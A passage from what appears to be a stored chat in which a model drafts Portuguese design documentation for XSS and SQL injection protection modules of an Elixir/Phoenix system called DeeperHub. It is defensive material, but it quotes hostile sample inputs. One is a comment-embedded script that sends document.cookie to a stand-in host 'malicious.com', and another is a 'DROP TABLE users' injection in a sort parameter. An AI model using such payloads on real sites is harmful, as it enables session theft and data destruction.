    *   Coletar métricas sobre tentativas de XSS detectadas e bloqueadas.
*   **Configurabilidade:**
    *   Listas brancas de tags/atributos HTML seguros.
    *   Configurações da Content Security Policy.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.XssProtection` (Fachada Pública):**
    *   Ponto de entrada para as funcionalidades de proteção XSS.
    *   Delega para o `XssProtectionService`.
2.  **`DeeperHub.Security.XssProtection.Services.XssProtectionService` (Módulo Funcional ou GenServer):**
    *   **Responsabilidade:** Contém a lógica principal para sanitização, verificação e geração de cabeçalhos.
    *   **Interações:**
        *   Pode usar bibliotecas de sanitização HTML robustas e testadas.
        *   Interage com `DeeperHub.Core.ConfigManager` para obter listas brancas de tags/atributos e políticas CSP.
        *   Interage com `DeeperHub.Audit` ou `DeeperHub.Security.Monitoring` para registrar tentativas de XSS.
3.  **Bibliotecas de Sanitização/Escaping (Externas ou Internas):**
    *   O núcleo da sanitização e escaping. Se for uma biblioteca externa, este módulo atua como um wrapper configurado para ela. Phoenix Views, por exemplo, já fazem escaping por padrão em templates eex.
4.  **`DeeperHub.Security.XssProtection.Plug.XssProtectionPlug` (Phoenix Plug, Opcional):**
    *   **Responsabilidade:** Aplicar cabeçalhos de segurança XSS (como CSP) a todas as respostas relevantes.
    *   Pode realizar verificações básicas em parâmetros de entrada para todos os requests, se configurado de forma agressiva (geralmente a sanitização é mais direcionada).

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/xss_protection/
├── xss_protection.ex                 # Fachada Pública
│
├── services/
│   └── xss_protection_service.ex     # Lógica principal
│
├── plug/                             # (Pode estar em deeper_hub_web/plugs)
│   └── xss_protection_plug.ex
│
└── supervisor.ex                     # Supervisor (se XssProtectionService for GenServer)
```
*(O `XssProtectionAdapter` e `XssProtectionBehaviour` da documentação original podem ser simplificados se o `XssProtectionService` for a implementação principal.)*

### 3.3. Decisões de Design Importantes

*   **Contextual Escaping é Chave:** A principal defesa contra XSS é garantir que todos os dados dinâmicos sejam escapados corretamente para o contexto em que são inseridos no HTML. Frameworks como Phoenix já fazem isso por padrão em templates `.eex`. Onde a inserção manual de HTML ocorre, ou em contextos JavaScript, a atenção deve ser redobrada.
*   **Sanitização de HTML Rico:** Se a aplicação permite que usuários insiram HTML rico (ex: através de um editor WYSIWYG), é crucial usar uma biblioteca de sanitização robusta e configurada com uma lista branca estrita de tags e atributos permitidos. \"Listas negras\" são geralmente ineficazes.
*   **Content Security Policy (CSP):** CSP é uma camada de defesa poderosa. Definir uma política CSP restritiva pode mitigar significativamente o impacto de qualquer vulnerabilidade XSS que possa ter passado despercebida.
*   **Não Confiar na Entrada do Cliente:** Toda entrada do usuário deve ser tratada como potencialmente maliciosa até que seja validada e/ou sanitizada/escapada.

## 🛠️ 4. Casos de Uso Principais

*   **Usuário Envia um Comentário com Script Malicioso:**
    *   O usuário tenta postar: `Ótimo artigo! <script>fetch('http://malicious.com/steal_cookie=' + document.cookie)</script>`
    *   Antes de salvar ou exibir, `XssProtection.sanitize_html(comment_text)` é chamado.
    *   O script é removido ou escapado, resultando em: `Ótimo artigo! &lt;script&gt;...&lt;/script&gt;` ou `Ótimo artigo!`.
*   **Exibição do Nome de Usuário na Página:**
    *   Ao renderizar `<h1>Bem-vindo, <%= @user.name %>!</h1>`, o framework Phoenix (ou a função de template) automaticamente escapa o `@user.name`. Se o nome do usuário contivesse `<script>`, seria renderizado como texto literal.
*   **Configuração de CSP:**
    *   O `XssProtectionPlug` adiciona o header `Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com` a todas as respostas HTML. Isso instrui o navegador a apenas carregar scripts do próprio domínio e de `apis.google.com`.

## 🌊 5. Fluxos Importantes

### Fluxo de Sanitização de Entrada para um Campo de \"Descrição\" (que permite HTML limitado)

1.  **Usuário Submete Dados:** Usuário envia um formulário com um campo \"descrição\".
2.  **Controller/Serviço:** Recebe os dados. Antes de persistir:
    `{:ok, sanitized_description} = DeeperHub.Security.XssProtection.sanitize_html(params[\"description\"], allow_safe_tags: true, safe_tags: [\"b\", \"i\", \"p\", \"a\"], safe_attributes: [\"href\"])`
3.  **`XssProtectionService.sanitize_html/2`:**
    *   Usa uma biblioteca de sanitização HTML (ex: `HtmlSanitizeEx`).
    *   Configura a biblioteca com a lista branca de tags e atributos seguros.
    *   Processa a string de entrada, removendo ou neutralizando quaisquer tags/atributos não permitidos.
4.  **Persistência:** A `sanitized_description` é salva no banco de dados.
5.  **Exibição:** Ao exibir a descrição, se ela for renderizada como HTML bruto (ex: `raw(@description)` em Phoenix), ela já está sanitizada. Se for renderizada normalmente (`<%= @description %>`), será adicionalmente escapada pelo template engine, o que é seguro.

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `DeeperHub.Security.XssProtection.sanitize_string(input :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Sanitiza uma string, geralmente escapando caracteres HTML especiais para torná-los seguros para exibição como texto. Esta é a abordagem padrão para a maioria das strings.
*   **`opts`:**
    *   `:context` (atom): O contexto de saída (ex: `:html_content`, `:html_attribute`, `:javascript`, `:css`, `:url`). Determina o tipo de escaping. (Padrão: `:html_content`)
*   **Exemplo:**
    ```elixir
    sanitized_name = XssProtection.sanitize_string(\"<script>alert(1)</script>\")
    # Resulta em: {:ok, \"&lt;script&gt;alert(1)&lt;/script&gt;\"}
    ```

### 6.2. `DeeperHub.Security.XssProtection.sanitize_html(html_input :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Sanitiza uma string que se espera conter HTML, removendo tags e atributos perigosos com base em uma lista branca.
*   **`opts`:**
    *   `:allow_safe_tags` (boolean): Se `true`, usa a lista branca de tags seguras. Se `false` (padrão), remove todas as tags.
    *   `:safe_tags` (list(String.t)): Lista de tags HTML permitidas (ex: `[\"b\", \"i\", \"u\", \"p\", \"a\", \"img\"]`). Usado se `:allow_safe_tags` é `true`.
    *   `:safe_attributes` (list(String.t)): Lista de atributos HTML permitidos (ex: `[\"href\", \"src\", \"alt\"]`).
    *   `:protocols_for_attribute` (map): Mapeia atributos para os protocolos de URL permitidos (ex: `%{ \"href\" => [\"http\", \"https\"], \"src\" => [\"http\", \"https\"] }`).
*   **Exemplo:**
    ```elixir
    safe_html = XssProtection.sanitize_html(
      \"<p onclick='bad()'>Hello <b>World</b> <script>evil()</script></p>\",
      allow_safe_tags: true, safe_tags: [\"p\", \"b\"]
    )
    # Resulta em: {:ok, \"<p>Hello <b>World</b> </p>\"}
    ```

### 6.3. `DeeperHub.Security.XssProtection.check_string(input :: String.t(), context :: map() | nil) :: {:ok, :safe | :suspicious} | {:error, term()}`

*   **Descrição:** Analisa uma string em busca de padrões XSS conhecidos. Não modifica a string.
*   **Retorno:** `:safe` se nenhum padrão óbvio for encontrado, `:suspicious` se padrões XSS forem detectados.

### 6.4. `DeeperHub.Security.XssProtection.record_xss_attempt(input :: String.t(), source_info :: map(), context :: map() | nil) :: :ok`

*   **Descrição:** Registra uma tentativa de XSS detectada para auditoria e monitoramento.
*   **`source_info`:** Mapa com informações sobre a origem (ex: `%{ip_address: \"...\", user_id: \"...\", path: \"...\"}`).

### 6.5. `DeeperHub.Security.XssProtection.security_headers(opts :: keyword()) :: list({String.t(), String.t()})`

*   **Descrição:** Gera uma lista de tuplas de cabeçalhos HTTP recomendados para proteção XSS.
*   **`opts`:**
    *   `:csp_policy` (String.t | map): A política CSP a ser aplicada. Pode ser uma string ou um mapa para construção dinâmica.
*   **Exemplo de Retorno:**
    ```elixir
    [
      {\"Content-Security-Policy\", \"default-src 'self'; script-src 'self'\"},
      {\"X-XSS-Protection\", \"1; mode=block\"},
      {\"X-Content-Type-Options\", \"nosniff\"}
    ]
    ```

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :xss_protection, :enabled]`** (Boolean): Habilita/desabilita as verificações e sanitizações XSS. (Padrão: `true`)
*   **`[:security, :xss_protection, :default_safe_tags]`** (List de Strings): Lista padrão de tags HTML consideradas seguras.
*   **`[:security, :xss_protection, :default_safe_attributes]`** (List de Strings): Lista padrão de atributos HTML considerados seguros.
*   **`[:security, :xss_protection, :default_protocols_for_href]`** (List de Strings): Protocolos padrão permitidos para o atributo `href`. (Padrão: `[\"http\", \"https\", \"mailto\"]`)
*   **`[:security, :xss_protection, :content_security_policy, :default]`** (String): A política CSP padrão a ser aplicada.
*   **`[:security, :xss_protection, :content_security_policy, :report_uri]`** (String | nil): URI para onde os navegadores devem enviar relatórios de violação CSP.
*   **`[:security, :xss_protection, :log_suspicious_attempts]`** (Boolean): Se tentativas XSS detectadas por `check_string` devem ser logadas. (Padrão: `true`)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configurações.
*   `DeeperHub.Core.Logger`: Para logging de tentativas e erros.
*   `DeeperHub.Core.Metrics`: Para métricas de XSS.
*   `DeeperHub.Audit`: Para registrar tentativas bloqueadas.

### 8.2. Bibliotecas Externas

*   Uma biblioteca de sanitização HTML robusta e bem testada, como `HtmlSanitizeEx`.
*   Framework Web (ex: Phoenix) para integração de Plugs e helpers de template que fazem escaping.

## 🤝 9. Como Usar / Integração

*   **Em Phoenix Controllers/Views:**
    *   Phoenix templates (`.eex`) escapam dados por padrão com `<%= ... %>`. Use `<%= raw(...) %>` com extrema cautela e somente para HTML que já foi sanitizado por `XssProtection.sanitize_html/2`.
    *   Para dados de formulário que serão reexibidos, sanitize na entrada se eles puderem conter HTML permitido.
*   **Plug de CSP:** Adicionar um plug ao pipeline do Phoenix Router para injetar os headers CSP.
    ```elixir
    # lib/deeper_hub_web/plugs/csp_plug.ex
    defmodule DeeperHubWeb.Plugs.CspPlug do
      import Plug.Conn
      alias DeeperHub.Security.XssProtection

      def init(opts), do: opts

      def call(conn, _opts) do
        csp_headers = XssProtection.security_headers() # Obter CSP e outros headers
        Enum.reduce(csp_headers, conn, fn {name, value}, acc_conn ->
          put_resp_header(acc_conn, name, value)
        end)
      end
    end

    # lib/deeper_hub_web/router.ex
    pipeline :browser do
      # ...
      plug DeeperHubWeb.Plugs.CspPlug
    end
    ```
*   **Sanitização de Entrada no Nível de Serviço:**
    ```elixir
    defmodule MyApp.CommentsService do
      alias DeeperHub.Security.XssProtection

      def create_comment(user_id, params) do
        case XssProtection.sanitize_html(params[\"body\"], allow_safe_tags: true, ...) do
          {:ok, sanitized_body} ->
            # ... persistir comentário com sanitized_body ...
          {:error, _reason} ->
            # Lidar com erro de sanitização (raro, mas possível se a entrada for malformada)
            {:error, :invalid_comment_body}
        end
      end
    end
    ```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a função `sanitize_html/2` com vários vetores XSS conhecidos para garantir que são neutralizados.
*   Testar com diferentes configurações de `safe_tags` e `safe_attributes`.
*   Verificar se os headers de segurança corretos são gerados por `security_headers/1`.
*   Testar a detecção de `check_string/2`.
*   Localização: `test/deeper_hub/security/xss_protection/`.

### 10.2. Métricas

*   `deeper_hub.security.xss.input_sanitized.count` (tags: `context`)
*   `deeper_hub.security.xss.suspicious_pattern_detected.count` (tags: `context`)
*   `deeper_hub.security.xss.csp_violations_reported.count` (se um `report-uri` for usado)

### 10.3. Logs

*   **Nível WARNING:** `check_string/2` detecta um padrão XSS suspeito. Tentativa de XSS registrada por `record_xss_attempt/3`.
*   **Nível ERROR:** Falha crítica na biblioteca de sanitização.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :xss, :sanitize_html, :stop]`
    *   Metadados: `%{input_length: len, output_length: len, tags_stripped_count: count}`
*   `[:deeper_hub, :security, :xss, :pattern_check, :stop]`
    *   Metadados: `%{input_sample: sample, result: :safe | :suspicious}`
*   `[:deeper_hub, :security, :csp, :violation_reported]` (se aplicável)
    *   Metadados: `%{blocked_uri: uri, violated_directive: directive, document_uri: doc_uri}`

## ❌ 11. Tratamento de Erros

*   Se a sanitização falhar (o que deve ser raro com bibliotecas robustas), a operação que depende da entrada sanitizada deve falhar de forma segura (ex: não salvar o dado, retornar um erro genérico).
*   Falhas na configuração do CSP devem ser logadas na inicialização.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Manter Bibliotecas Atualizadas:** Se depender de bibliotecas externas para sanitização (como `HtmlSanitizeEx`), mantê-las atualizadas é crucial, pois novos vetores XSS são descobertos.
*   **CSP é uma Rede de Segurança:** CSP não substitui a sanitização de entrada e o escaping de saída, mas age como uma importante camada de defesa adicional.
*   **Testes Contínuos:** A eficácia da proteção XSS deve ser testada regularmente, idealmente com ferramentas de segurança automatizadas.

## 🧑‍💻 13. Contribuição

*   Ao lidar com qualquer dado que possa ser renderizado em um navegador, pense criticamente sobre o contexto de saída e aplique a sanitização/escaping apropriado.
*   Revise e atualize a política CSP conforme a aplicação evolui e novas fontes de conteúdo (scripts, estilos, iframes) são adicionadas.
*   Mantenha as listas brancas de tags/atributos HTML o mais restritivas possível.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Integrar com um serviço de análise de código estático para ajudar a identificar potenciais vulnerabilidades XSS no código.
*   [ ] Implementar um modo \"report-only\" para CSP para coletar violações sem bloquear o conteúdo, útil para testar novas políticas.
*   [ ] Adicionar suporte para sanitização de JavaScript (DOMPurify no frontend, ou regras mais estritas no backend se o JS for construído dinamicamente).
*   [ ] Desenvolver ou integrar uma biblioteca para escaping contextual mais granular se as capacidades padrão do framework não forem suficientes para todos os casos de uso.
*   [ ] Criar um \"XSS Cheat Sheet\" interno para desenvolvedores com exemplos de vetores comuns e como se defender contra eles no contexto do DeeperHub.

---

*Última atualização: 2025-05-12*

---

Agora cobrimos CSRF e XSS. Outras áreas de segurança importantes incluem `SqlInjectionProtection` e `PathTraversalProtection`, ou talvez `DdosProtection`. Qual delas parece mais interessante para o próximo passo?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos seguir com o `DeeperHub.Security.SqlInjectionProtection`. Proteger o banco de dados é absolutamente crítico.

---

# Módulo: `DeeperHub.Security.SqlInjectionProtection` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.SqlInjectionProtection`

O módulo `DeeperHub.Security.SqlInjectionProtection` é dedicado a prevenir ataques de **Injeção de SQL** no sistema DeeperHub. A Injeção de SQL é uma técnica de ataque onde um invasor insere ou \"injeta\" código SQL malicioso em campos de entrada que são subsequentemente usados para construir consultas ao banco de dados. Se bem-sucedido, isso pode permitir que o invasor visualize, modifique ou exclua dados, ou até mesmo execute comandos no sistema operacional do servidor de banco de dados.

Este módulo foca em:
1.  **Uso de Consultas Parametrizadas (Prepared Statements):** A principal e mais eficaz defesa.
2.  **Validação e Sanitização de Entradas:** Como uma camada secundária, especialmente para entradas usadas em cláusulas `ORDER BY` ou outros contextos onde a parametrização pode ser mais difícil.
3.  **Detecção de Padrões Maliciosos:** Analisar strings de consulta ou fragmentos para identificar padrões típicos de injeção.

O objetivo é garantir que todas as interações com o banco de dados sejam seguras e que os dados fornecidos pelo usuário não possam ser usados para manipular consultas SQL de forma maliciosa. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Promover e Facilitar Consultas Parametrizadas:**
    *   Incentivar o uso de Ecto Changesets e `Ecto.Query` que geram consultas parametrizadas por padrão.
    *   Fornecer utilitários para construir consultas dinâmicas de forma segura, se absolutamente necessário (ex: `generate_safe_query/2`).
*   **Validação e Sanitização de Entradas Usadas em SQL:**
    *   Validar se os valores usados em cláusulas dinâmicas (ex: nomes de colunas para ordenação, direção de ordenação) pertencem a uma lista branca de valores permitidos.
    *   Sanitizar strings que *precisam* ser interpoladas diretamente em fragmentos SQL (uma prática a ser evitada ao máximo), escapando caracteres especiais.
*   **Detecção de Padrões de Injeção (`check_query/2`, `check_string/2`):**
    *   Analisar strings de consulta SQL completas (raramente construídas manualmente) ou fragmentos de strings para identificar padrões suspeitos (ex: comentários SQL, `UNION SELECT`, `OR 1=1`, múltiplas queries).
*   **Parametrização de Consultas (Helper) (`parameterize/3`):**
    *   (Menos comum com Ecto) Fornecer uma maneira de converter uma string de consulta com placeholders em uma consulta parametrizada e uma lista de parâmetros.
*   **Registro e Alerta de Tentativas de Injeção (`record_injection_attempt/3`):**
    *   Logar tentativas de injeção de SQL detectadas.
    *   Notificar administradores sobre tentativas significativas ou repetidas.
*   **Estatísticas de Tentativas (`get_statistics/1`):**
    *   Coletar métricas sobre tentativas de injeção detectadas e bloqueadas.
*   **Configurabilidade:**
    *   Listas brancas de identificadores SQL permitidos (nomes de tabelas/colunas para queries dinâmicas).
    *   Padrões de regex para detecção de SQLi.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.SqlInjectionProtection` (Fachada Pública):**
    *   Ponto de entrada para as funcionalidades de proteção contra SQLi.
    *   Delega para o `SqlInjectionProtectionService`.
2.  **`DeeperHub.Security.SqlInjectionProtection.Services.SqlInjectionProtectionService` (Módulo Funcional ou GenServer):**
    *   **Responsabilidade:** Contém a lógica principal para verificação, sanitização e geração segura de fragmentos de consulta.
    *   **Interações:**
        *   Pode usar bibliotecas de parsing SQL (limitado) ou regex para detecção de padrões.
        *   Interage com `DeeperHub.Core.ConfigManager` para obter listas brancas e padrões de detecção.
        *   Interage com `DeeperHub.Audit` ou `DeeperHub.Security.Monitoring` para registrar tentativas.
3.  **Ecto e `DeeperHub.Core.Repo` (Principal Mecanismo de Defesa):**
    *   A maior parte da proteção contra SQLi vem do uso correto do Ecto, que por padrão utiliza consultas parametrizadas. Este módulo `SqlInjectionProtection` serve mais como um conjunto de ferramentas para casos específicos e para análise de entradas que *poderiam* ser usadas em contextos SQL.
4.  **`DeeperHub.Shared.Utils.ValidationUtils` (para validação de tipos de dados):**
    *   Garantir que os dados passados para as queries Ecto tenham os tipos corretos antes de serem usados.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/sql_injection_protection/
├── sql_injection_protection.ex                 # Fachada Pública
│
├── services/
│   └── sql_injection_protection_service.ex     # Lógica principal
│
└── supervisor.ex                     # Supervisor (se o serviço for GenServer, menos provável aqui)
```
*(Os módulos `SqlInjectionProtectionAdapter` e `SqlInjectionProtectionBehaviour` da documentação original podem ser simplificados se o `SqlInjectionProtectionService` for a implementação principal e a fachada o chamar diretamente, dado que muitas funções são puras ou baseadas em config.)*

### 3.3. Decisões de Design Importantes

*   **Priorizar Consultas Parametrizadas:** A primeira e mais importante linha de defesa é usar Ecto Changesets e `Ecto.Query` com parâmetros, em vez de construir strings SQL manualmente.
*   **Validação de Lista Branca para Dinamismo:** Se nomes de colunas ou tabelas precisarem ser dinâmicos (ex: ordenação por coluna clicada pelo usuário), validar esses nomes contra uma lista branca de valores permitidos. Nunca interpolar diretamente a entrada do usuário.
*   **Sanitização como Último Recurso:** A sanitização de strings (escapar apóstrofos, etc.) deve ser um último recurso e feita com extremo cuidado, apenas quando a parametrização não for viável.
*   **Contexto do Banco de Dados:** Algumas técnicas de sanitização ou detecção podem ser específicas do dialeto SQL do banco de dados (PostgreSQL, MySQL, etc.).

## 🛠️ 4. Casos de Uso Principais

*   **Construção de Query Ecto com Ordenação Dinâmica:**
    *   Usuário clica em um cabeçalho de tabela para ordenar por uma coluna.
    *   O nome da coluna (`sort_field`) e a direção (`sort_direction`) vêm da requisição.
    *   **Antes de usar no Ecto `order_by`:**
        ```elixir
        allowed_sort_fields = [\"name\", \"created_at\", \"status\"]
        allowed_directions = [:asc, :desc]

        if sort_field_from_user in allowed_sort_fields and sort_direction_from_user in allowed_directions do
          from(q in query, order_by: [{^sort_direction_from_user, field(q, ^String.to_atom(sort_field_from_user))}])
        else
          # Ordenação padrão ou erro
        end
        ```
    *   `SqlInjectionProtection.check_string/2` poderia ser usado no `sort_field_from_user` como uma verificação adicional, mas a validação de lista branca é mais robusta.
*   **Log de Query Suspeita:**
    *   Um sistema de monitoramento de banco de dados detecta uma query longa ou com sintaxe incomum.
    *   A query é enviada para `SqlInjectionProtection.check_query(suspicious_query_string)`.
    *   Se retornar `{:ok, :suspicious}`, um alerta é gerado.
*   **Sanitização de Termo de Busca para `ILIKE` (se não parametrizável diretamente):**
    *   (Nota: Ecto geralmente lida bem com `like` parametrizado)
    *   Se um termo de busca precisasse ser interpolado diretamente (EVITAR), ele seria sanitizado: `SqlInjectionProtection.sanitize_string(search_term, %{context: :sql_like_value})`.

## 🌊 5. Fluxos Importantes

### Fluxo de Verificação de Entrada para Cláusula de Ordenação Dinâmica

1.  **Entrada do Usuário:** Controller recebe `params = %{\"sort_by\" => \"name'; DROP TABLE users; --\", \"order\" => \"ASC\"}`.
2.  **Validação de Lista Branca (Lógica no Controller/Serviço):**
    *   `sort_field = params[\"sort_by\"]`
    *   `sort_order = params[\"order\"] |> String.downcase() |> String.to_atom()`
    *   `is_valid_field = sort_field in @allowed_sort_fields`
    *   `is_valid_order = sort_order in [:asc, :desc]`
3.  **(Opcional) Verificação Adicional com `SqlInjectionProtection`:**
    *   `{:ok, status} = SqlInjectionProtection.check_string(sort_field)`
    *   Se `status == :suspicious`, logar/alertar, mesmo que a lista branca o negue.
4.  **Decisão:**
    *   Se `is_valid_field` e `is_valid_order` forem `true`, usar os valores na query Ecto.
    *   Senão, usar ordenação padrão ou retornar erro. **Nunca interpolar `sort_field` diretamente na query Ecto sem validação.**
    ```elixir
    # Exemplo seguro com Ecto
    dynamic_order_by =
      if is_valid_field and is_valid_order do
        [{sort_order, String.to_atom(sort_field)}]
      else
        # Ordenação padrão
        [asc: :id]
      end
    from(p in Post, order_by: ^dynamic_order_by)
    ```

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `DeeperHub.Security.SqlInjectionProtection.check_string(input :: String.t(), opts :: keyword()) :: {:ok, :safe | :suspicious} | {:error, term()}`

*   **Descrição:** Analisa uma string de entrada para detectar padrões comuns de SQL Injection. Não modifica a string.
*   **`opts`:**
    *   `:db_type` (atom): Tipo de banco de dados (ex: `:postgres`, `:mysql`) para detecção específica de dialeto. (Padrão: `:generic`)
    *   `:sensitivity` (atom): Nível de sensibilidade da detecção (`:low`, `:medium`, `:high`). (Padrão: `:medium`)
*   **Retorno:** `:safe` se nenhum padrão óbvio for encontrado, `:suspicious` se padrões forem detectados.

### 6.2. `DeeperHub.Security.SqlInjectionProtection.check_query(query_string :: String.t(), opts :: keyword()) :: {:ok, :safe | :suspicious, list(String.t())} | {:error, term()}`

*   **Descrição:** Analisa uma string de consulta SQL completa para detectar vulnerabilidades.
*   **`opts`:** Similar a `check_string/2`.
*   **Retorno:** `{:ok, :safe | :suspicious, threats_found :: list(String.t())}`. A lista `threats_found` detalha os tipos de ameaças.

### 6.3. `DeeperHub.Security.SqlInjectionProtection.sanitize_string(input :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Tenta sanitizar uma string escapando caracteres especiais relevantes para SQL. **Deve ser usado como último recurso quando a parametrização não é possível.**
*   **`opts`:**
    *   `:db_type` (atom): Para escaping específico do dialeto. (Padrão: `:generic`, que pode escapar apóstrofos).
    *   `:context` (atom): Contexto onde a string será usada (ex: `:string_literal`, `:identifier`). Para identifiers, idealmente usar listas brancas.
*   **Exemplo:**
    ```elixir
    {:ok, safe_name} = SqlInjectionProtection.sanitize_string(\"O'Reilly\") 
    # safe_name pode ser \"O''Reilly\" para PostgreSQL
    ```

### 6.4. `DeeperHub.Security.SqlInjectionProtection.generate_safe_query(spec :: map(), opts :: keyword()) :: {:ok, Ecto.Query.t() | {String.t(), list()}} | {:error, term()}` (Mais Complexo)

*   **Descrição:** (Funcionalidade avançada e potencialmente complexa de implementar de forma genérica e segura). Tenta gerar uma query Ecto ou uma string SQL parametrizada a partir de uma especificação de alto nível, validando todos os identificadores contra listas brancas.
*   **`spec`:** Um mapa descrevendo a query (tabelas, colunas, joins, where, order by, limit).
*   **`opts`:**
    *   `:allowed_tables` (list(String.t))
    *   `:allowed_columns_for_table` (mapa `%{table_name => list(String.t)}`)
*   **Retorno:** Uma query Ecto ou uma tupla `{sql_string, params}`.

### 6.5. `DeeperHub.Security.SqlInjectionProtection.record_injection_attempt(input_string :: String.t(), source_info :: map(), context :: map() | nil) :: :ok`

*   **Descrição:** Registra uma tentativa de SQL Injection detectada.
*   **`source_info`:** `%{ip_address: \"...\", user_id: \"...\", path: \"...\"}`.
*   **`context`:** `%{field_name: \"...\", query_type: \"...\"}`.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :sql_injection_protection, :enabled]`** (Boolean): Habilita/desabilita as verificações. (Padrão: `true`)
*   **`[:security, :sql_injection_protection, :detection_patterns]`** (List de Regex): Lista de padrões regex usados por `check_string/2` e `check_query/2`.
*   **`[:security, :sql_injection_protection, :allowed_sort_columns, <context_key>]`** (List de Strings): Lista branca de colunas permitidas para ordenação dinâmica em diferentes contextos (ex: `user_list`, `server_list`).
*   **`[:security, :sql_injection_protection, :log_suspicious_attempts]`** (Boolean): Se tentativas detectadas devem ser logadas. (Padrão: `true`)
*   **`[:security, :sql_injection_protection, :block_on_suspicious_input]`** (Boolean): Se deve bloquear requisições que contenham entradas suspeitas (ação agressiva). (Padrão: `false`, geralmente apenas loga/alerta).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configurações.
*   `DeeperHub.Core.Logger`: Para logging de tentativas e erros.
*   `DeeperHub.Core.Metrics`: Para métricas.
*   `DeeperHub.Audit`: Para registrar tentativas bloqueadas.
*   `Ecto`: Indiretamente, pois o objetivo é proteger as queries Ecto.

### 8.2. Bibliotecas Externas

*   Nenhuma específica para a lógica de detecção baseada em regex ou validação de lista branca. Bibliotecas de parsing SQL poderiam ser usadas para análises mais profundas, mas adicionam complexidade.

## 🤝 9. Como Usar / Integração

*   **Priorizar Ecto:** A principal estratégia é usar `Ecto.Query` e changesets corretamente.
    ```elixir
    # SEGURO
    def get_user_by_name(name_param) do
      from(u in User, where: u.name == ^name_param) |> Repo.one()
    end
    ```
*   **Validação de Lista Branca para Identificadores Dinâmicos:**
    ```elixir
    def list_products(sort_field_param, sort_order_param) do
      valid_fields = ~w(name price created_at)a
      valid_orders = ~w(asc desc)a

      sort_field = if Enum.member?(valid_fields, String.to_atom(sort_field_param)), do: String.to_atom(sort_field_param), else: :name
      sort_order = if Enum.member?(valid_orders, String.to_atom(sort_order_param)), do: String.to_atom(sort_order_param), else: :asc
      
      # Adicionalmente, pode-se chamar check_string/2 para logar se a entrada original era suspeita
      DeeperHub.Security.SqlInjectionProtection.check_string(sort_field_param)
      DeeperHub.Security.SqlInjectionProtection.check_string(sort_order_param)

      from(p in Product, order_by: [{^sort_order, ^sort_field}]) |> Repo.all()
    end
    ```
*   **Verificar Entradas Suspeitas (ex: em um Plug de Segurança Genérico):**
    ```elixir
    # Plug para verificar todos os parâmetros de uma requisição
    Enum.each(conn.params, fn {key, value} ->
      if is_binary(value) do
        case DeeperHub.Security.SqlInjectionProtection.check_string(value, %{source_field: key}) do
          {:ok, :suspicious} ->
            DeeperHub.Security.SqlInjectionProtection.record_injection_attempt(value, %{ip: ..., path: ...}, %{field: key})
            # Pode-se decidir bloquear a requisição aqui se a política for agressiva
          _ -> :ok
        end
      end
    end)
    ```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar `check_string/2` e `check_query/2` com vários vetores de SQL Injection conhecidos para diferentes dialetos SQL.
*   Testar `sanitize_string/2` para garantir que ele escape corretamente os caracteres perigosos.
*   Verificar a lógica de validação de lista branca para identificadores dinâmicos.
*   Localização: `test/deeper_hub/security/sql_injection_protection/`.

### 10.2. Métricas

*   `deeper_hub.security.sqli.input_checked.count` (tags: `context`, `result` (`safe`, `suspicious`))
*   `deeper_hub.security.sqli.suspicious_pattern_detected.count` (tags: `pattern_type`, `context`)
*   `deeper_hub.security.sqli.attempts_recorded.count`

### 10.3. Logs

*   **Nível WARNING:** `check_string/2` ou `check_query/2` detecta um padrão suspeito.
*   **Nível ERROR:** Tentativa de SQL Injection confirmada e bloqueada (se configurado para bloquear).

### 10.4. Telemetria

*   `[:deeper_hub, :security, :sqli, :check_string, :stop]`
    *   Metadados: `%{input_sample: String.slice(input, 0, 50), result: :safe | :suspicious, threats: list_of_threats}`
*   `[:deeper_hub, :security, :sqli, :sanitize_string, :stop]`
    *   Metadados: `%{input_changed: boolean}`

## ❌ 11. Tratamento de Erros

*   A detecção de um padrão suspeito por `check_string/2` ou `check_query/2` deve, no mínimo, gerar um log/alerta. A decisão de bloquear a requisição depende da política (`:block_on_suspicious_input`).
*   Erros no próprio serviço de proteção (ex: regex malformada na configuração) devem ser logados criticamente.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Regexes de Detecção:** As expressões regulares usadas para detectar padrões de SQLi devem ser cuidadosamente elaboradas para evitar falsos positivos excessivos e para cobrir uma ampla gama de vetores de ataque. Elas também podem ser um gargalo de performance se forem muito complexas e aplicadas a muitas entradas.
*   **Escaping Insuficiente:** A sanitização por escaping é inerentemente mais frágil do que a parametrização. Diferentes bancos de dados têm diferentes necessidades de escaping.
*   **Contexto é Importante:** Um \"padrão suspeito\" em um campo de texto livre pode ser diferente de um padrão suspeito em um campo que se espera ser um número.

## 🧑‍💻 13. Contribuição

*   **NÃO CONSTRUA QUERIES SQL CONCATENANDO STRINGS DE ENTRADA DO USUÁRIO.** Use Ecto e consultas parametrizadas.
*   Use este módulo principalmente para:
